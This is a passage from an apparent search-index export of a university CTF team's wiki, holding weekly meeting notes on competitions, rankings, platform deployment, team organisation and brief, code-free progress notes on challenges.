teams who have entered the preliminary competition and are now in the preliminary judging process. The finalists will be announced on July 26. At present, I have completed the payment and other procedures for the two teams in the competition, and I am waiting for your good news.</p> <p>preliminary teams list from the official website</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-06-29/#0x3-summer-recruitment","title":"0x3. Summer recruitment","text":"<p>Reference: 2023 summer recruitment and training schedule</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-06-29/#0x4-other-remarkable-information","title":"0x4. Other remarkable information","text":"<p>\u201c\u534e\u4e3a\u676f\u201d\u7b2c\u4e8c\u5c4a\u4e2d\u56fd\u7814\u7a76\u751f\u7f51\u7edc\u5b89\u5168\u521b\u65b0\u5927\u8d5b\u9080\u8bf7\u51fd</p> <p>https://cpipc.acge.org.cn//cw/detail/2c90800c8093eef401809d33b36f0652/2c90801787f062ab0188719bbb3a7891</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-06-29/#summary","title":"Summary","text":"<p>Congratulations to the COMPASS team for the first-class prize in the National College Computer Security Competition. The final contest would be held in July. We also have 2 teams that participated in the opus competition. The most amazing news is that we are going to have the summer recruitment in the next week. I'm planning an introduction talk as well.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-02-17/","title":"CTF Week Meeting 2022-02-17","text":"<ol> <li>How to improve my skills/techniques?</li> <li>Wiki/Blog collection.</li> <li>Competitions.</li> </ol>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-02-17/#improvement","title":"Improvement","text":"<p>About our mission this semester: self-improvement and advanced skills learning. </p> <p>A. material learning and reading.</p> <p>B. challenge/competition solving.</p> <p>C. vulnerability dig and website/open-source pen-testing.</p> <p>D. sharing.</p> <p>It's highly encouraged to share your blog/wirteups with us. Talking with each other in the group is also a good method to get improved.</p> <p>Don't be shy.</p> <p>Don't be afraid to talk with \"dalao\". In fact, all of us are grown from newbies. And in fact, none of us is satisfied with our current knowledge.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-02-17/#collection","title":"Collection","text":"<p>I've encountered some difficulties these days. It's hard to find new contents to learn about. I need your help.</p> <p>The goal of having more collections about the wiki/forum/blog is to fully access the CTF and hacking. We are going to design a book about CTF.</p> <p>The contributions would help us:</p> <p>A. design this book.</p> <p>B. handle a daily sharing bot/wechat channel.</p> <p>Everything you find may help above can send to me.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-02-17/#competition","title":"Competition","text":"<p>TQLCTF\u9ad8\u6821\u8d5b</p> <p>https://datacon.qianxin.com/competitions/21/introduction</p> <p>TQLCTF\u9ad8\u6821\u6311\u6218\u8d5b\u7531\u6e05\u534e\u5927\u5b66\uff08\u7f51\u7edc\u7814\u7a76\u9662\uff09\u5947\u5b89\u4fe1\u96c6\u56e2\u7f51\u7edc\u5b89\u5168\u8054\u5408\u7814\u7a76\u4e2d\u5fc3\u4e3b\u529e\uff0c\u7531\u6e05\u534e\u5927\u5b66Redbud\u6218\u961f\u53ca\u5947\u5b89\u4fe1\u6280\u672f\u7814\u7a76\u9662\u8054\u5408\u547d\u9898\uff0c\u672c\u6b21\u7ade\u8d5b\u65e8\u5728\u63d0\u9ad8\u9ad8\u6821\u5728\u6821\u751f\u7f51\u7edc\u5b89\u5168\u6280\u80fd\uff0c\u4e3a\u7f51\u7edc\u5b89\u5168\u9009\u62d4\u4f18\u79c0\u4eba\u624d\u3002\u5168\u56fd\u9ad8\u6821\u5728\u6821\u751f\u5747\u53ef\u62a5\u540d\u53c2\u52a0\u6bcf\u961f\u62a5\u540d\u4eba\u6570\u4e0d\u5f97\u8d85\u8fc710\u4eba\u3002 \u6b64\u6b21\u7ade\u8d5b\u51a0\u4e9a\u5b63\u519b\u961f\u4f0d\u5c06\u76f4\u63a5\u664b\u7ea7TQLCTF\u4eac\u6d25\u5180\u7ebf\u4e0b\u6311\u6218\u8d5b\uff0c\u4f53\u9a8c\u5168\u65b0AWD\u7ade\u8d5b\u6a21\u5f0f\u4ee5\u53ca\u6c89\u6d78\u5f0fCTF\u7ade\u8d5b\u89c6\u89c9\u76db\u5bb4\uff01</p> <p>\u65f6\u95f4\uff1a2022-02-19 09:00-2022-02-20 21:00</p> <p>\u4e3b\u529e\u65b9\uff1a\u6e05\u534e\u5927\u5b66(\u7f51\u7edc\u7814\u7a76\u9662)\uff0c\u5947\u5b89\u4fe1\u96c6\u56e2\u5b89\u5168\u8054\u5408\u7814\u7a76\u4e2d\u5fc3</p> <p>VU CYBERTHON 2022</p> <p>https://2022.cyberthon.lt/event_starts</p> <p>Participants will get access to the cyber security tournament system and they will have 24 hours to solve CTF challenges.</p> <p>\u661f\u671f\u4e94, 18 \u4e8c\u6708 2022, 01:00 CST \u2014 \u661f\u671f\u516d, 19 \u4e8c\u6708 2022, 01:00 CST</p> <p>Event organizers </p> <ul> <li>VU Cyberthon</li> </ul>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-02-17/#note","title":"Note","text":"<ul> <li>[x] SRC\u5e73\u53f0\u4f3c\u4e4e\u9650\u5236\u4e86\u6821\u5185\u8bbf\u95ee\uff1f</li> <li>[ ] \u5bfb\u627e\u5916\u90e8\u7684\u534f\u52a9\u4e0e\u5927\u4f6c\u3002</li> <li>[ ] \u8bfe\u672c\u9009\u62e9\u4e00\u4e9b\u7ecf\u5178\u7684\u9898\u76ee\u4f5c\u4e3a\u5c55\u793a\u3002</li> <li>[ ] \u8bfe\u672c\u9879\u76ee\u7684\uff08\u4f1a\u8bae\uff09\u5e73\u53f0\u4e0e\u9879\u76ee\u652f\u6301\u3002</li> <li>[ ] wiki\u7684\u7ef4\u62a4\uff1a\u4e0b\u5468\u516d\uff0824-26\u8fd4\u6821\uff09\u3002</li> </ul>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-02-24/","title":"CTF Week Meeting 2022-02-24","text":"<ol> <li>Review of the last week.</li> <li>Recent competitions: VU CTF 2022 &amp; TQL CTF 2022.</li> <li>First offline activity for this semester.</li> <li>Competitions this weekend.</li> </ol>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-02-24/#review-of-the-last-week","title":"Review of the last week","text":""},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-02-24/#xsrc-platform","title":"XSRC Platform","text":"<p>https://xsrc.its.sustech.edu.cn/</p> <p>Not working properly now. Having asked the developers from ITS. They have given instructive advice:</p> <p><code>Use email then.</code></p> <p>itsserver#sustech.edu.cn</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-02-24/#wikiblog-collection","title":"Wiki/Blog Collection","text":"<p>https://github.com/tanjiti/sec_profile</p> <p>A repo about security profile.</p> <p>Gonna use information from this list first. All the blog and personal websites would be added soon.</p> <p><code>Project: TG Sec Bot</code></p> <p>The project information and the initial proposal would be posted on GitHub and invite you (if interested).</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-02-24/#improvement","title":"Improvement","text":"<p>Working on the security analysis and CVE post. Found several vulnerabilities from ThinkPHP and its plugins.</p> <p>sqlmap analysis shows it's not vulnerable. Doing some SCA recently.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-02-24/#communication","title":"Communication","text":"<p>I have emailed several top teams and waiting for their response.</p> <p>The experience from top teams is really important. Besides, not only for CTF, but also for security developers and engineers.</p> <ul> <li>Nu1L</li> <li>GML-SEC</li> <li>AAA</li> <li>\u96f7\u795e\u4f17\u6d4b</li> <li>\u5e73\u5b89\u94f6\u6cb3\u5b9e\u9a8c\u5ba4</li> </ul>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-02-24/#competition-rank","title":"Competition Rank","text":""},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-02-24/#vu-ctf-2022","title":"VU CTF 2022","text":"<p>Rank 78</p> <p>As an exercise competition got in the top 100.</p> <p></p> <p></p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-02-24/#tql-ctf-2022","title":"TQL CTF 2022","text":"<p>Rank 37</p> <p>Doesn't have enough participants. Maybe better.</p> <p></p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-02-24/#first-offline-activity","title":"First Offline Activity","text":"<p>Our first offline competition activity would be held this Saturday.</p> <p>According to the recently COVID-19, shall the offline activity move to online?</p> <ol> <li>If offline: I'm going to order the meeting room 515 Southern Tower, Engineering Department. Welcome to participate.</li> <li>If online: we would have an online meeting for competition and sharing this Saturday, which lasts 4 hours.</li> </ol> <p>The sharing would be given by myself this week. I'd like to talk about the Rust programming language.</p> <p>If you want to share anything else, it's highly recommended to give a talk this weekend.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-02-24/#competitions","title":"Competitions","text":""},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-02-24/#codegate-ctf-2022-preliminary","title":"Codegate CTF 2022 Preliminary","text":"<p>\u661f\u671f\u516d, 26 \u4e8c\u6708 2022, 18:00 CST \u2014 \u661f\u671f\u65e5, 27 \u4e8c\u6708 2022, 18:00 CST</p> <p>http://www.codegate.org/</p> <p>We are going to participate in the <code>General</code> team. The top 9 teams from the General group would be allowed to the final competition.</p> <p>The maximum team size is 4 members</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-02-24/#ugra-ctf-quals-2022-optional","title":"Ugra CTF Quals 2022 (Optional)","text":"<p>\u661f\u671f\u516d, 26 \u4e8c\u6708 2022, 15:00 CST \u2014 \u661f\u671f\u4e8c, 01 \u4e09\u6708 2022, 15:00 CST</p> <p>https://2022.ugractf.ru/</p> <p>The event would be in Russia. Maybe we need to use some translation tools.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-02-24/#susctf-2022-optional","title":"SUSCTF 2022 (Optional)","text":"<p>\u661f\u671f\u516d, 26 \u4e8c\u6708 2022, 09:00 CST \u2014 \u661f\u671f\u4e00, 28 \u4e8c\u6708 2022, 09:00 CST</p> <p>https://susctf2022.xctf.org.cn/</p> <p>By SUSr. The name is very likely SUSTC. So, maybe you are interested.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-02-24/#note","title":"Note","text":"<ul> <li>[ ] \u9898\u76ee\u5e73\u53f0\u73af\u5883\u6302\u4e86\uff0c\u8003\u8651\u7ef4\u62a4\u548cdocker-compose</li> </ul> <p>A. \u670d\u52a1\u5668\u73af\u5883\u81ea\u52a8\u542f\u52a8</p> <p>B. SaaS\u7528\u6237\u542f\u52a8\u65b9\u6848</p> <ul> <li>[ ] CTF Book\u52a8\u6001\u66f4\u65b0\uff0c\u6574\u7406\u7ae0\u8282\u76ee\u5f55\u548c\u6750\u6599</li> <li>[ ] \u8ddf\u8fdbBlack Hat Submission\u7684\u4fe1\u606f</li> </ul>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-03/","title":"CTF Week Meeting 2022-03-03","text":"<ol> <li>Review of the recent competitions.</li> <li>COMPASS CTF platform has moved back to VPS.</li> <li>Wiki page update and maintenance.</li> <li>Competition of the weekend.</li> </ol>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-03/#competition-review","title":"Competition Review","text":""},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-03/#codegate-2022","title":"CODEGATE 2022","text":"<p>We have achieved rank 29.</p> <p></p> <p>The rank is in the top tier 2 list. The top 20 teams are very famous <code>organizers</code>, <code>r3kpig</code>, <code>DiceGang</code>, <code>Oops</code>, and <code>perfect blue</code>. Our rank is along with <code>Super Guesser</code>. In the meanwhile, we have won <code>Redbud</code> for continuous 3 times.</p> <p>Still, we have some areas to improve. First of all, all of our scores are from the Web category. PWN is still an area we should improve.</p> <p>The Rev and Crypto of the codegate are very difficult.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-03/#ctfshow","title":"CTFshow","text":"<p>Congratulations to Frankss!</p> <p>Looking forward to your next rank 1 in CTF!</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-03/#ctf-platform","title":"CTF Platform","text":"<p>In the past very long time, we use CTFd online collocation system to deploy our platform. The CTFd online service is limited now.</p> <p>The black box of CTFd doesn't offer us direct interaction with the source code and the plugins. In order to make further improvements, we are going to switch back to the local VPS deployment.</p> <p>We have 2 plans:</p> <p>A. use my personal VPS server. The VPS is in Hong Kong with 8 CPU cores and 16 GB of memory. The access of VPS is open to the public network. In order to deploy in my VPS, we need to assign an SSL certification and allocate a domain name service to the docker image.</p> <p>B. use COMPASS server. The COMPASS server is very high performance. To use the COMPASS's Detroit server, we can directly use the <code>compass.sustech.edu.cn</code> domain name. But the access is limited to the campus. If we want to let users outside the SUSTech access, we need to deploy a jump service.</p> <p>We need to assign the maintenance of the CTF platform to our members. If you are interested, please let me know. The work of the maintenance involves:</p> <ol> <li>make sure the platform is online and the docker image is working properly.</li> <li>make sure all the challenge container is online.</li> <li>analysis of the network traffic logs to prevent attackers.</li> </ol>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-03/#wiki","title":"Wiki","text":"<p>The Wiki page is critical for our public information. We have updated our Wiki page several times.</p> <p>https://wiki.compass.college/member/</p> <p>On the members' page, we have all of our members' cards. Currently, all the members' information is using our Wechat profile and the area is set to <code>ALL</code>.</p> <p>Obviously, we need to update this page. Please send me your area.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-03/#competition","title":"Competition","text":"<p>https://mp.weixin.qq.com/s?__biz=Mzg5NTc0ODE4Ng==&amp;mid=2247483653&amp;idx=1&amp;sn=8f2f74843dd5eff531be187823d9fc90&amp;chksm=c00ad030f77d5926157929aee64fab31ead3b2b727777633a567a1dc5a579dd3f8a61d603435&amp;mpshare=1&amp;scene=23&amp;srcid=0302kUF13DdLm2lLcV7DCIqL&amp;sharer_sharetime=1646213771898&amp;sharer_shareid=612cf76d62ce2a19afbb97fe3bdd60a8#rd</p> <p>https://www.qianxin.com/DCICHF/2022</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-03/#note","title":"Note","text":"<ul> <li>[ ] \u62a4\u7f51\u884c\u52a8\u7533\u8bf7\u76f8\u5173\uff0c\u8fdb\u884c\u8054\u7edc\u3002</li> <li>[x] Wiki\u7684\u8054\u7edc\u65b9\u5f0f\u6dfb\u52a0\uff0c\u5468\u56db\u4f1a\u8bae\u7684link\u94fe\u63a5\u3002</li> <li>[x] Wiki\u7684meeting notes\u653e\u5728\u66f4\u663e\u773c\u7684\u5730\u65b9\u3002</li> <li>[ ] \u5bf9\u5916\u5ba3\u4f20\u7684\u5de5\u4f5c\u3002</li> </ul>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-10/","title":"CTF Week Meeting 2022-03-10","text":"<ol> <li>Review of the recent competitions.</li> <li>Review of the recent works.</li> <li>Course from the SU team.</li> <li>Competition event for this week.</li> <li>Drunk too much coffee.</li> </ol>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-10/#competition-review","title":"Competition Review","text":"<p>You may notice the awards we've got have been pushed to the wiki.</p> <p>We have participated in the eCTF for practice last week.</p> <p></p> <p>Challenge solving process:</p> <ul> <li>Forensics 3 / 8</li> <li>Crypto 3 / 8</li> <li>Misc 5 / 5 AK</li> <li>RE-pwn 4 / 5</li> <li>OSINT 1 / 8 (Oh God...)</li> <li>Web 3 / 3 AK</li> <li>Easy peasy 2 /2 AK</li> </ul> <p>The challenges quality is on average.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-10/#project-review","title":"Project Review","text":"<p>I've started too many projects in the recent meetings...</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-10/#daily-article-bot","title":"Daily Article Bot","text":"<p>The project aims to publish news, blogs, and writeups from personal websites. Going to follow the steps:</p> <ul> <li>Catch several websites.</li> <li>Telegram bot.</li> <li>Mail subscribe link.</li> </ul> <p>I have created the Rust project for the Telegram bot using the following template:</p> <p>https://github.com/telegram-rs/telegram-bot</p> <p>The function would be done soon.</p> <p>If you are interested in the Mail subscribe service's development, please let me know.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-10/#platform","title":"Platform","text":"<p>Thanks to the very brief description of the installing instruction, deploying ctfd-whale is hard.</p> <ul> <li>[x] Move all the data to the local machine.</li> <li>[ ] Establish ctfd-whale.</li> <li>[ ] Package all the challenges to the docker image.</li> <li>[x] Establish SSL certification.</li> </ul> <p>I'll find it out these days.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-10/#research-related","title":"Research Related","text":"<p>Do you remember the Chaff Bug?</p> <p>https://wiki.compass.college/Paper/Misc/Chaff%20Bugs%20Deterring%20Attackers%20by%20Making%20Software%20Buggier/</p> <p>In brief: the Chaff is an idea to create hundreds of fake buffer overflow points. The work of the attackers is increased by non-vulnerable bugs.</p> <p>However, SCA (Source Code Analysis), concolic analysis, and Fuzzing can solve this problem.</p> <p>The PWN challenges from CTF can also be solved by the concolic analysis. The famous <code>angr</code> is often used to do the job.</p> <p>https://angr.io/</p> <p>We also know the CGC (Cyber Grand Challenge) is major in automated software analysis.</p> <p>A survey of the Cyber Reasoning System: https://ieeexplore.ieee.org/abstract/document/8411838</p> <p>I'm going to summarize the research on CRS and SCA.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-10/#wiki-contact","title":"Wiki Contact","text":"<p>I've added the contact email address to Wiki.</p> <p>As well as the weekly meeting address.</p> <p>https://wiki.compass.college/</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-10/#learn-from-su-team","title":"Learn from SU Team","text":"<p>It's all from an article forwarded by Frankss.</p> <p>https://team-su.github.io/</p> <p>SU team has achieved the top rank in SUSCTF 2022. SU team is a united team of members in the universities (we are a university team with all of us from SUSTech).</p> <p>SU team is established in 2016, and be famous in 2022.</p> <p>The cooperation experience from SU:</p> <ul> <li>Collaborate with the university club.</li> <li>Communication with members, teachers from other teams.</li> <li>An experienced member leads a new member.</li> <li>Layer management: each orientation has an admin.</li> <li>Each member concentration on the specific orientation.</li> <li>Reduce the pigeons.</li> <li>Solving the challenges with a girlfriend.</li> </ul> <p>I've pm each member to confirm the major orientation.</p> <p>The communication with the SU team is in the progress. Hopefully, we would talk with them in the future.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-10/#competition","title":"Competition","text":"<p>The 1337UP live CTF (Jeopardy, dynamic score from 500 to 50)</p> <p>The team size is 4.</p> <p>https://ctf.intigriti.io/</p> <p>\u661f\u671f\u4e94, 11 \u4e09\u6708 2022, 23:00 CST \u2014 \u661f\u671f\u516d, 12 \u4e09\u6708 2022, 23:00 CST</p> <p>The top 3 teams would get cash awards.</p> <p>The top 10 teams would receive some 1337UP swag.</p> <p>The top 100 teams would receive a souvenir certificate, and an increased chance to be invited to the private program of the Intigriti.</p> <p>This is the first 1337UP CTF.</p> <p>The organizer: Intigriti (Europe's #1 ethical hacking and bug bounty platform)</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-10/#drunk-too-much-coffee","title":"Drunk too much coffee","text":"<p>Take care of yourself.</p> <p>Doing some exercise can be helpful.</p> <p>I hope COVID-19 will end soon.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-10/#note","title":"Note","text":"<ul> <li>[x] \u8fdb\u5c55\u7acb\u5373\u53cd\u9988\uff0c\u5468\u4f1a\u8fdb\u884c\u603b\u7ed3</li> <li>[x] notion\u6a21\u677f\u7684\u6539\u52a8\uff0c\u6bd4\u8d5b\u8d1f\u8d23\u4eba</li> </ul>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-17/","title":"CTF Week Meeting 2022-03-17","text":"<ol> <li>Competition schedule.</li> <li>CTF Platform dynamic container.</li> <li>Competition management.</li> </ol>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-17/#competition-schedule","title":"Competition Schedule","text":"<p>2022\u6570\u5b57\u4e2d\u56fd\u521b\u65b0\u5927\u8d5b\u864e\u7b26\u7f51\u7edc\u5b89\u5168\u8d5b\u9053</p> <p>\u65f6\u95f4\uff1a2022-03-19 09:00 ~ 2022-03-20 17:00</p> <p>https://datacon.qianxin.com/competitions/22/introduction</p> <p>\u664b\u7ea7\u8d44\u683c\uff1a\u521d\u8d5b\u6210\u7ee9\u6392\u540d\u524d35\u7684\u961f\u4f0d\uff08\u7ebf\u4e0a\u521d\u8d5b\u6210\u7ee9\u6392\u540d\u524d20\u7684\u9ad8\u6821\u6218\u961f+\u7ebf\u4e0a\u521d\u8d5b\u6210\u7ee9\u6392\u540d\u524d15\u7684\u884c\u4e1a\u6218\u961f\uff09\u8fdb\u5165\u51b3\u8d5b\uff0c\u540c\u4e00\u96c6\u56e2\u5355\u4f4d\u3001\u9ad8\u6821\u6700\u591a\u53ea\u80fd\u5165\u56f42\u652f\u6218\u961f\uff0c\u6bcf\u961f\u4e0d\u8d85\u8fc74\u4eba\uff0c\u53ca\u4e00\u540d\u9886\u961f\uff0c\u51b3\u8d5b\u524d\u961f\u5458\u53ef\u66f4\u6362\uff0c\u4f46\u8981\u6c42\u53c2\u8d5b\u9009\u624b\u9700\u662f\u521d\u8d5b\u62a5\u540d\u4eba\u5458\uff0c\u5e76\u4e14\u5fc5\u987b\u6765\u81ea\u540c\u4e00\u96c6\u56e2\u5355\u4f4d\u6216\u9ad8\u6821\uff0c\u8fdb\u5165\u603b\u51b3\u8d5b\u5355\u4f4d/\u884c\u4e1a\u6218\u961f\u9700\u63d0\u4f9b\u534a\u5e74\u4ee5\u4e0a\u7684\u672c\u5355\u4f4d\u793e\u4fdd\u8bc1\u660e\uff0c\u5404\u9ad8\u6821\u6218\u961f\u9700\u63d0\u4f9b\u52a0\u76d6\u6240\u5728\u540c\u4e00\u9ad8\u6821\u516c\u7ae0\u7684\u5728\u8bfb\u8bc1\u660e\uff0c\u5982\u53d1\u73b0\u4efb\u4f55\u4f5c\u5f0a\u3001\u4ee3\u6253\u884c\u4e3a\uff0c\u5c06\u76f4\u63a5\u53d6\u6d88\u6bd4\u8d5b\u8d44\u683c\u5e76\u8fdb\u884c\u516c\u544a\u3002</p> <p>Misc: \u5468\u7ff0\u7136\u3001\u9648\u6893\u6db5\u3001\u5deb\u6653\u3001\u6731\u5609\u6960</p> <p>Web: \u91d1\u8087\u8f69\u3001\u4e25\u6587\u8c26</p> <p>Re: \u90ac\u4e00\u5e06\u3001\u6731\u5f18</p> <p>PWN: \u674e\u7167\u3001\u90ac\u4e00\u5e06</p> <p>Crypto: \u6731\u5609\u6960\u3001\u5468\u7ff0\u7136\u3001\u4e25\u6587\u8c26</p> <p>\u9898\u76ee\u6574\u7406 &amp; \u540c\u6b65\uff1a\u90ac\u4e00\u5e06\u3001\u674e\u7167</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-17/#ctfd-dynamic-container","title":"CTFd Dynamic Container","text":"<p>Current solution: https://github.com/frankli0324/ctfd-whale/</p> <p>The dependency <code>frp</code> is vulnerable to SSRF in the history (and very likely now), and have been bypassed several times.</p> <ul> <li>Should we still deploy on the COMPASS server?</li> </ul> <p>The local deployment is successful and ready to use, but we may have a better alternative.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-17/#competition-management","title":"Competition Management","text":"<p>For each competition, we would have an administrator. The admin has the following tasks:</p> <ul> <li>Synchronize the challenges to the Notion.</li> <li>Collect the writeups after the competition.</li> </ul> <p>The competitions would use Notion to update.</p> <ul> <li>Contact @Frankss to be invited.</li> </ul> <p>The competitions would use Discord to chat.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-17/#note","title":"Note","text":"<ul> <li>[ ] \u5e73\u53f0\u5206\u5e03\u90e8\u7f72\uff0c\u5bb9\u5668\u653e\u5728\u6821\u5916</li> </ul>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-24/","title":"CTF Week Meeting 2022-03-24","text":"<ol> <li>Past: Hufu CTF 2022.</li> <li>On going: T3N4CI0US CTF 2022</li> <li>Plan: Line CTF</li> </ol>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-24/#hufu-ctf-2022","title":"Hufu CTF 2022","text":"<p>2022\u6570\u5b57\u4e2d\u56fd\u521b\u65b0\u5927\u8d5b\u864e\u7b26\u7f51\u7edc\u5b89\u5168\u8d5b\u9053</p> <p>\u65f6\u95f4\uff1a2022-03-19 09:00 ~ 2022-03-20 17:00</p> <p>https://datacon.qianxin.com/competitions/22/introduction</p> <p>\u664b\u7ea7\u8d44\u683c\uff1a\u521d\u8d5b\u6210\u7ee9\u6392\u540d\u524d35\u7684\u961f\u4f0d\uff08\u7ebf\u4e0a\u521d\u8d5b\u6210\u7ee9\u6392\u540d\u524d20\u7684\u9ad8\u6821\u6218\u961f+\u7ebf\u4e0a\u521d\u8d5b\u6210\u7ee9\u6392\u540d\u524d15\u7684\u884c\u4e1a\u6218\u961f\uff09\u8fdb\u5165\u51b3\u8d5b\uff0c\u540c\u4e00\u96c6\u56e2\u5355\u4f4d\u3001\u9ad8\u6821\u6700\u591a\u53ea\u80fd\u5165\u56f42\u652f\u6218\u961f\uff0c\u6bcf\u961f\u4e0d\u8d85\u8fc74\u4eba\uff0c\u53ca\u4e00\u540d\u9886\u961f\uff0c\u51b3\u8d5b\u524d\u961f\u5458\u53ef\u66f4\u6362\uff0c\u4f46\u8981\u6c42\u53c2\u8d5b\u9009\u624b\u9700\u662f\u521d\u8d5b\u62a5\u540d\u4eba\u5458\uff0c\u5e76\u4e14\u5fc5\u987b\u6765\u81ea\u540c\u4e00\u96c6\u56e2\u5355\u4f4d\u6216\u9ad8\u6821\uff0c\u8fdb\u5165\u603b\u51b3\u8d5b\u5355\u4f4d/\u884c\u4e1a\u6218\u961f\u9700\u63d0\u4f9b\u534a\u5e74\u4ee5\u4e0a\u7684\u672c\u5355\u4f4d\u793e\u4fdd\u8bc1\u660e\uff0c\u5404\u9ad8\u6821\u6218\u961f\u9700\u63d0\u4f9b\u52a0\u76d6\u6240\u5728\u540c\u4e00\u9ad8\u6821\u516c\u7ae0\u7684\u5728\u8bfb\u8bc1\u660e\uff0c\u5982\u53d1\u73b0\u4efb\u4f55\u4f5c\u5f0a\u3001\u4ee3\u6253\u884c\u4e3a\uff0c\u5c06\u76f4\u63a5\u53d6\u6d88\u6bd4\u8d5b\u8d44\u683c\u5e76\u8fdb\u884c\u516c\u544a\u3002</p> <p>Misc: \u5468\u7ff0\u7136\u3001\u9648\u6893\u6db5\u3001\u5deb\u6653\u3001\u6731\u5609\u6960</p> <p>Web: \u91d1\u8087\u8f69\u3001\u4e25\u6587\u8c26</p> <p>Re: \u90ac\u4e00\u5e06\u3001\u6731\u5f18</p> <p>PWN: \u674e\u7167\u3001\u90ac\u4e00\u5e06</p> <p>Crypto: \u6731\u5609\u6960\u3001\u5468\u7ff0\u7136\u3001\u4e25\u6587\u8c26</p> <p>\u9898\u76ee\u6574\u7406 &amp; \u540c\u6b65\uff1a\u90ac\u4e00\u5e06\u3001\u674e\u7167</p> <p></p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-24/#t3n4ci0us-ctf-2022","title":"T3N4CI0US CTF 2022","text":"<p>The competition is on processing. We have several challenges to solve.</p> <p>The current rank is #4, 2 challenge (and 20 points for hints) left to be rank 1.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-24/#webrobots","title":"Web/Robots","text":"<p>Got 2 sub pages: /robots.txt and /hint.html</p> <p>As the hint goes, we should find /fiag.html, but failed.</p> <p>Hint: Something's wrong with the word 'fiag'. \\&lt;head line&gt;Password Decryption</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-24/#webyessyess","title":"Web/YessYess","text":"<p>Python SSTI injection with filters. The underline, dot, and parenthesis are filtered out.</p> <p>Could use unicode conversion.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-24/#miscpws","title":"Misc/pws","text":"<p>Don't know what's the meaning of the file.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-24/#miscangry","title":"Misc/angry","text":"<p>Got a Base36-like string, don't know what to do next.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-24/#crypto1337-wallet","title":"Crypto/1337 Wallet","text":"<p>scrypt-hash decryption without password.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-24/#forensicsgrizzly","title":"Forensics/Grizzly","text":"<p>A zip file inside the given picture. Doesn't have the password.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-24/#forensicsdobby","title":"Forensics/Dobby","text":"<p>The text can be decrypted with string Dobby is not free in flag format, but not the flag.</p> <p>@Frankss: the picture has some hidden mosaic below after adjusting the height.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-24/#misc","title":"Misc/()","text":"<p>Don't know the meaning of the challenge.</p> <p>Hint: understand the meaning of 